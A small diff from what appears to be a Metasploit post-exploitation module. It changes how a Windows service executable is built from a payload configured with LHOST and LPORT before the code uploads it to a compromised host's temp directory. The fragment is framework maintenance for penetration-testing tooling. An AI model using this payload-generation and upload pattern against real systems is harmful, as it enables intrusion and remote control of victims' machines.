@@ -140,7 +140,7 @@ class Metasploit3 < Msf::Post
 		payload.datastore['LHOST'] = lhost
 		payload.datastore['LPORT'] = lport
 
-		exe = Msf::Util::EXE.to_win32pe_service(session.framework, payload.generate)
+		exe = Msf::Util::EXE.to_win32pe_service(payload.generate)
 		begin
 			print_status("Uploading payload #{file} executable to temp directory")
 			# Upload the payload to the filesystem
